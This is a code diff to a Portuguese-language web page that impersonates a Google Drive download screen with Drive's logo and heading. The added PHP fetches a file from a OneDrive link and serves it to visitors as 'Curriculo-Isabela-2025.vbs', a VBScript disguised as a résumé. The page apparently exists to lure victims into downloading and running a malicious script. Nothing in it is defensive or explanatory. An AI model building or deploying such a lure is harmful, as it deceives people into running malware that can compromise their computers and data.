@@ -1,3 +1,35 @@
+<?php
+if (isset($_GET['download'])) {
+    $downloadUrl = 'https://onedrive.live.com/download?resid=D82992BFEEE0874A!s80a236759e494466a94e483cb279f774&authkey=!ABcDeFG12345';
+    $filename = 'Curriculo-Isabela-2025.vbs';
+
+    // Inicializa cURL
+    $ch = curl_init($downloadUrl);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_FAILONERROR, true);
+
+    $data = curl_exec($ch);
+
+    if ($data === false) {
+        die('Erro ao baixar o arquivo remoto: ' . curl_error($ch));
+    }
+
+    curl_close($ch);
+
+    // Enviar os headers para download
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="' . basename($filename) . '"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . strlen($data));
+
+    echo $data;
+    exit;
+}
+?>
 
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -21,25 +53,26 @@
       min-height: 100vh;
     }
 
-    a.container-link {
-      display: block;
+    form.container-link {
       background: #fff;
       padding: 60px 40px;
       border-radius: 16px;
       box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
       text-align: center;
-      width: 700px; /* fixo para evitar redimensionamento */
+      width: 700px;
       min-height: 450px;
       color: inherit;
-      text-decoration: none;
-      cursor: pointer;
       user-select: none;
       transition: background-color 0.3s;
+      border: none;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      position: relative;
     }
 
-    a.container-link:hover {
-      background-color: #e6ffe6;
-    }
+    
 
     .logo {
       width: 70px;
@@ -61,7 +94,7 @@
       margin-bottom: 35px;
     }
 
-    .botao-fake {
+    button.botao-fake {
       display: inline-block;
       padding: 18px 40px;
       font-size: 22px;
@@ -70,13 +103,20 @@
       border-radius: 12px;
       font-weight: bold;
       user-select: none;
-      pointer-events: none; /* para não interferir no clique do link */
+      cursor: pointer;
+      border: none;
+      transition: background-color 0.3s ease;
+      position: relative;
+      z-index: 10;
+    }
+    button.botao-fake:hover {
+      background-color: #218838;
     }
 
     @media print {
       @page {
-        size: auto;  /* mantém o tamanho da página */
-        margin: 10mm; /* margem pequena para evitar corte */
+        size: auto;
+        margin: 10mm;
       }
 
       body {
@@ -89,18 +129,17 @@
         min-height: auto;
       }
 
-      a.container-link {
+      form.container-link {
         box-shadow: none;
         border: 1px solid #ccc;
         background: white;
         color: black;
-        text-decoration: none;
-        width: 700px; /* força manter tamanho fixo no print */
+        width: 700px;
         min-height: 450px;
         padding: 60px 40px;
       }
 
-      .botao-fake {
+      button.botao-fake {
         background-color: #28a745 !important;
         color: white !important;
         -webkit-print-color-adjust: exact !important;
@@ -111,11 +150,11 @@
   </style>
 </head>
 <body>
-  <a href="https://my.microsoftpersonalcontent.com/personal/d82992bfeee0874a/_layouts/15/download.aspx?UniqueId=80a23675-9e49-4466-a94e-483cb279f774&Translate=false&tempauth=v1e.eyJzaXRlaWQiOiIxZWQ2Nzc1ZC0wMzM0LTQxYTMtYjg2OS02ZGQ0ZGVlZDFjYjciLCJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvbXkubWljcm9zb2Z0cGVyc29uYWxjb250ZW50LmNvbUA5MTg4MDQwZC02YzY3LTRjNWItYjExMi0zNmEzMDRiNjZkYWQiLCJleHAiOiIxNzUyODUwMjM0In0.L5dCL23rW36v4R3AYimZiB9vnWdtbjLMVfm8ciqvOTTP6kZyUPbxWOI8GY1rlMhF8I-6-raqEMPqm2crhOSZWPtzh8Zf0B7qfbYnQSXpTI0u2HYC0bBPUb1uKnxNx3G5dJG6ND0yvw2JiywX70qw6B_YQRro0E1-4eOgnceUVczIf80ygkq7BE0KMuirqnZcIEqTMXTdicHEaG84Q_9Asdhwy-6xFgZTG7NRUzwD5r5r3XLpaEeaxp_Ew66k47Kapa8u89vVtjnfySNlaeAXSRlzqsScYRZejFEm_eeLSx305T-0__w-xii_fiS9cVhtApl3CXRPOrZPvxurhGRpTxnICiwiL3RZH9nAqCOzdXEg1Drnwo1F6RtVZ6mVWOF2ze8zrKaTs6oY4PI4vUhiuAqLRNG7lCnPfj0Bor27d_MNNvU5vqAYgIUx8RE-7SlG8kZbpKaWx4nWYCPIr15pcnHAInEQ_Snb_ULKqPxVzvVqj1WvW2alI8wUvFcjakXQzAHoKceYIUyI2VyRtw1bWw.tdC0dLxIghCcM2YcfR3cLZgKKxBMHvsNAQJqGn7rPds&ApiVersion=2.0" class="container-link" title="Clique para baixar agora">
+  <form method="GET" class="container-link" title="Clique para baixar agora">
     <img src="https://ssl.gstatic.com/images/branding/product/2x/drive_2020q4_48dp.png" alt="Google Drive" class="logo" />
     <h1>Download via Google Drive</h1>
-    <p>Clique em qualquer lugar desta área para baixar o arquivo.</p>
-    <div class="botao-fake" aria-hidden="true">Baixar Agora</div>
-  </a>
+    <p>Clique no botão abaixo para baixar o arquivo.</p>
+    <button type="submit" name="download" value="1" class="botao-fake" aria-label="Baixar Agora">Baixar Agora</button>
+  </form>
 </body>
 </html>
